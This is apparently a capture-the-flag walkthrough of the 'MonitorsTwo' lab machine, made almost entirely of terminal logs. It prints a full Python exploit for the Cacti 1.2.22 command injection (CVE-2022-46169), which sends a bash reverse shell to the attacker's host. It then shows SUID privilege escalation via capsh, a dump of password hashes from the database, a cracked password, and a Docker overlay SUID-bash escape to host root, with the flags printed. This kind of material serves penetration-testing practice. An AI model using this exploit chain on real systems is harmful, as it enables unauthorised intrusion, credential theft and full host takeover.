```
┌──(witty㉿kali)-[~]
└─$ rustscan -a 10.10.11.211 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.11.211:22
Open 10.10.11.211:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 23:46 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:46
Completed NSE at 23:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:46
Completed NSE at 23:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:46
Completed NSE at 23:46, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 23:46
Completed Parallel DNS resolution of 1 host. at 23:46, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 23:46
Scanning 10.10.11.211 [2 ports]
Discovered open port 80/tcp on 10.10.11.211
Discovered open port 22/tcp on 10.10.11.211
Completed Connect Scan at 23:46, 0.19s elapsed (2 total ports)
Initiating Service scan at 23:46
Scanning 2 services on 10.10.11.211
Completed Service scan at 23:46, 6.53s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.211.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:46
Completed NSE at 23:46, 8.07s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:46
Completed NSE at 23:46, 0.99s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:46
Completed NSE at 23:46, 0.00s elapsed
Nmap scan report for 10.10.11.211
Host is up, received user-set (0.19s latency).
Scanned at 2023-07-26 23:46:22 EDT for 16s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:46
Completed NSE at 23:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:46
Completed NSE at 23:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:46
Completed NSE at 23:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.85 seconds


Version 1.2.22 | (c) 2004-2023 - The Cacti Group

https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22.git
Cloning into 'CVE-2022-46169-CACTI-1.2.22'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 15 (delta 3), reused 5 (delta 1), pack-reused 0
Receiving objects: 100% (15/15), 4.42 KiB | 755.00 KiB/s, done.
Resolving deltas: 100% (3/3), done.
                                                                            
┌──(witty㉿kali)-[~/Downloads]
└─$ cd CVE-2022-46169-CACTI-1.2.22 
                                                                            
┌──(witty㉿kali)-[~/Downloads/CVE-2022-46169-CACTI-1.2.22]
└─$ ls
CVE-2022-46169.py  README.md
                                                                            
┌──(witty㉿kali)-[~/Downloads/CVE-2022-46169-CACTI-1.2.22]
└─$ cat CVE-2022-46169.py         
import requests, optparse, sys
import urllib

def get_arguments():
    parser= optparse.OptionParser()
    parser.add_option('-u', '--url', dest='url_target', help='The url target')
    parser.add_option('', '--LHOST', dest='lhost', help='Your ip')
    parser.add_option('', '--LPORT', dest='lport', help='The listening port')
    (options, arguments) = parser.parse_args()
    if not options.url_target:
        parser.error('[*] Pls indicate the target URL, example: -u http://10.10.10.10')
    if not options.lhost:
        parser.error('[*] Pls indicate your ip, example: --LHOST=10.10.10.10')
    if not options.lport:
        parser.error('[*] Pls indicate the listening port for the reverse shell, example: --LPORT=443')
    return options

def checkVuln():
    r = requests.get(Vuln_url, headers=headers)
    return (r.text != "FATAL: You are not authorized to use this service" and r.status_code != 403)

def bruteForcing():
    for n in range(1,5):
        for n2 in range(1,10):
            id_vulnUrl = f"{Vuln_url}?action=polldata&poller_id=1&host_id={n}&local_data_ids[]={n2}"
            r = requests.get(id_vulnUrl, headers=headers)
            if r.text != "[]":
                RDname = r.json()[0]["rrd_name"]
                if RDname == "polling_time" or RDname == "uptime":
                    print("Bruteforce Success!!")
                    return True, n, n2
    return False, 1, 1

def Reverse_shell(payload, host_id, data_ids):
    PayloadEncoded = urllib.parse.quote(payload)
    InjectRequest = f"{Vuln_url}?action=polldata&poller_id=;{PayloadEncoded}&host_id={host_id}&local_data_ids[]={data_ids}"
    r = requests.get(InjectRequest, headers=headers)


if __name__ == '__main__':
    options = get_arguments()
    Vuln_url = options.url_target + '/remote_agent.php'
    headers = {"X-Forwarded-For": "127.0.0.1"}
    print('Checking...')
    if checkVuln():
        print("The target is vulnerable. Exploiting...")
        print("Bruteforcing the host_id and local_data_ids")
        is_vuln, host_id, data_ids = bruteForcing()
        myip = options.lhost
        myport = options.lport
        payload = f"bash -c 'bash -i >& /dev/tcp/{myip}/{myport} 0>&1'"
        if is_vuln:
            Reverse_shell(payload, host_id, data_ids)
        else:
            print("The Bruteforce Failled...")

    else:
        print("The target is not vulnerable")
        sys.exit(1)

┌──(root㉿kali)-[/home/witty/Downloads/CVE-2022-46169-CACTI-1.2.22]
└─# python3 CVE-2022-46169.py  -u http://10.10.11.211 --LHOST=10.10.14.26 --LPORT=443
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.11.211] 43358
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@50bca5e748b0:/var/www/html$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null
bash: python3: command not found
bash: python: command not found
www-data@50bca5e748b0:/var/www/html$ find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
< -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 30872 Oct 14  2020 /sbin/capsh
-rwsr-xr-x 1 root root 55528 Jan 20  2022 /bin/mount
-rwsr-xr-x 1 root root 35040 Jan 20  2022 /bin/umount
-rwsr-xr-x 1 root root 71912 Jan 20  2022 /bin/su
www-data@50bca5e748b0:/var/www/html$ /sbin/capsh --gid=0 --uid=0 --
/sbin/capsh --gid=0 --uid=0 --
root@50bca5e748b0:/var/www/html#
root@50bca5e748b0:/var/www/html# ls -lah /
ls -lah /
total 120K
drwxr-xr-x   1 root root 4.0K Mar 21 10:49 .
drwxr-xr-x   1 root root 4.0K Mar 21 10:49 ..
-rwxr-xr-x   1 root root    0 Mar 21 10:49 .dockerenv
drwxr-xr-x   1 root root 4.0K Mar 22 13:21 bin
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 boot
drwxr-xr-x   5 root root  340 Jul 27 18:34 dev
-rw-r--r--   1 root root  648 Jan  5  2023 entrypoint.sh
drwxr-xr-x   1 root root 4.0K Mar 21 10:49 etc
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 home
drwxr-xr-x   1 root root 4.0K Nov 15  2022 lib
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 lib64
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 media
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 mnt
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 opt
dr-xr-xr-x 291 root root    0 Jul 27 18:34 proc
drwx------   1 root root 4.0K Mar 21 10:50 root
drwxr-xr-x   1 root root 4.0K Jul 27 18:59 run
drwxr-xr-x   1 root root 4.0K Jan  9  2023 sbin
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 srv
dr-xr-xr-x  13 root root    0 Jul 27 18:34 sys
drwxrwxrwt   1 root root  32K Jul 28 00:34 tmp
drwxr-xr-x   1 root root 4.0K Nov 14  2022 usr
drwxr-xr-x   1 root root 4.0K Nov 15  2022 var

docker container

root@50bca5e748b0:/# cat entrypoint.sh
cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"

root@50bca5e748b0:/var/www/html# ls -lah cacti.sql
ls -lah cacti.sql
-rw-rw-r-- 1 www-data www-data 124K Aug 14  2022 cacti.sql

root@50bca5e748b0:/var/www/html# mysql --host=db --user=root --password=root cacti -e "select * from user_auth;"
<--password=root cacti -e "select * from user_auth;"
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
| id | username | password                                                     | realm | full_name      | email_address          | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
|  1 | admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |     0 | Jamie Thompson | admin@monitorstwo.htb  |                      | on              | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   663348655 |
|  3 | guest    | 43e9a4ab75570f5b                                             |     0 | Guest Account  |                        | on                   | on              | on        | on        | on           | 3              |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |           0 |
|  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |     0 | Marcus Brune   | marcus@monitorstwo.htb |                      |                 | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  | on     |               0 |        0 |  2135691668 |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+

┌──(root㉿kali)-[/home/witty/Downloads/CVE-2022-46169-CACTI-1.2.22]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash_marcus 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (?)     
1g 0:00:01:49 DONE (2023-07-27 20:43) 0.009114g/s 77.76p/s 77.76c/s 77.76C/s 474747..coucou
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(root㉿kali)-[/home/witty/Downloads/CVE-2022-46169-CACTI-1.2.22]
└─# ssh marcus@10.10.11.211
marcus@10.10.11.211's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 28 Jul 2023 12:44:37 AM UTC

  System load:                      0.0
  Usage of /:                       63.3% of 6.73GB
  Memory usage:                     20%
  Swap usage:                       0%
  Processes:                        256
  Users logged in:                  0
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.211
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:5409

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
marcus@monitorstwo:~$ ls
user.txt
marcus@monitorstwo:~$ cat user.txt 
df6fd2424907663bd6a8b3f1b68cc281

marcus@monitorstwo:~$ docker version
Client:
 Version:           20.10.5+dfsg1
 API version:       1.41
 Go version:        go1.15.9
 Git commit:        55c4c88
 Built:             Wed Aug  4 19:55:57 2021
 OS/Arch:           linux/amd64
 Context:           default
 Experimental:      true
Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/version": dial unix /var/run/docker.sock: connect: permission denied

https://github.com/UncleJ4ck/CVE-2021-41091

https://www.cyberark.com/resources/threat-research-blog/how-docker-made-me-more-capable-and-the-host-less-secure

marcus@monitorstwo:~$ findmnt
TARGET                                SOURCE     FSTYPE OPTIONS
/                                     /dev/sda2  ext4   rw,rela
├─/sys                                sysfs      sysfs  rw,nosu
│ ├─/sys/kernel/security              securityfs securi rw,nosu
│ ├─/sys/fs/cgroup                    tmpfs      tmpfs  ro,nosu
│ │ ├─/sys/fs/cgroup/unified          cgroup2    cgroup rw,nosu
│ │ ├─/sys/fs/cgroup/systemd          cgroup     cgroup rw,nosu
│ │ ├─/sys/fs/cgroup/net_cls,net_prio cgroup     cgroup rw,nosu
│ │ ├─/sys/fs/cgroup/cpu,cpuacct      cgroup     cgroup rw,nosu
│ │ ├─/sys/fs/cgroup/rdma             cgroup     cgroup rw,nosu
│ │ ├─/sys/fs/cgroup/freezer          cgroup     cgroup rw,nosu
│ │ ├─/sys/fs/cgroup/hugetlb          cgroup     cgroup rw,nosu
│ │ ├─/sys/fs/cgroup/memory           cgroup     cgroup rw,nosu
│ │ ├─/sys/fs/cgroup/cpuset           cgroup     cgroup rw,nosu
│ │ ├─/sys/fs/cgroup/pids             cgroup     cgroup rw,nosu
│ │ ├─/sys/fs/cgroup/devices          cgroup     cgroup rw,nosu
│ │ ├─/sys/fs/cgroup/perf_event       cgroup     cgroup rw,nosu
│ │ └─/sys/fs/cgroup/blkio            cgroup     cgroup rw,nosu
│ ├─/sys/fs/pstore                    pstore     pstore rw,nosu
│ ├─/sys/fs/bpf                       none       bpf    rw,nosu
│ ├─/sys/kernel/debug                 debugfs    debugf rw,nosu
│ ├─/sys/kernel/tracing               tracefs    tracef rw,nosu
│ ├─/sys/kernel/config                configfs   config rw,nosu
│ └─/sys/fs/fuse/connections          fusectl    fusect rw,nosu
├─/proc                               proc       proc   rw,nosu
│ └─/proc/sys/fs/binfmt_misc          systemd-1  autofs rw,rela
├─/dev                                udev       devtmp rw,nosu
│ ├─/dev/pts                          devpts     devpts rw,nosu
│ ├─/dev/shm                          tmpfs      tmpfs  rw,nosu
│ ├─/dev/hugepages                    hugetlbfs  hugetl rw,rela
│ └─/dev/mqueue                       mqueue     mqueue rw,nosu
├─/run                                tmpfs      tmpfs  rw,nosu
│ ├─/run/lock                         tmpfs      tmpfs  rw,nosu
│ ├─/run/docker/netns/2a9b9574f066    nsfs[net:[4026532598]]
│ │                                              nsfs   rw
│ ├─/run/user/1000                    tmpfs      tmpfs  rw,nosu
│ └─/run/docker/netns/6d6cdb336b6b    nsfs[net:[4026532659]]
│                                                nsfs   rw
├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
│                                     overlay    overla rw,rela
├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
│                                     shm        tmpfs  rw,nosu
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
│                                     overlay    overla rw,rela
└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
                                      shm        tmpfs  rw,nosu
marcus@monitorstwo:~$ tty
/dev/pts/0
marcus@monitorstwo:~$ who
marcus   pts/0        2023-07-28 00:44 (10.10.14.26)
marcus@monitorstwo:~$ w
 01:10:04 up  6:36,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
marcus   pts/0    10.10.14.26      00:44    4.00s  0.43s  0.00s w

root@50bca5e748b0:/var/www/html# chmod u+s /bin/bash
chmod u+s /bin/bash
root@50bca5e748b0:/var/www/html# ls -lah /bin/bash
ls -lah /bin/bash
-rwsr-xr-x 1 root root 1.2M Mar 27  2022 /bin/bash

marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
bash-5.1# cd /root
bash-5.1# ls
cacti  root.txt
bash-5.1# cat root.txt
09fccfadc73f3dcadd2ba4f370aff2d1
bash-5.1# cd cacti/
bash-5.1# ls
docker-compose.yml  entrypoint.sh
bash-5.1# cat entrypoint.sh 
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"
bash-5.1# cat docker-compose.yml
version: '2'
services:
  web:
    image: cacti:latest
    ports:
     - "127.0.0.1:8080:80"
    depends_on:
     - db
    entrypoint:
     - bash
     - /entrypoint.sh
    volumes:
     - ./entrypoint.sh:/entrypoint.sh
    command: apache2-foreground
    cap_drop:
     - mknod
     - dac_override
  db:
   image: mysql:5.7
   environment:
    - MYSQL_ROOT_PASSWORD=root
    - MYSQL_DATABASE=cacti

```

[[PC]]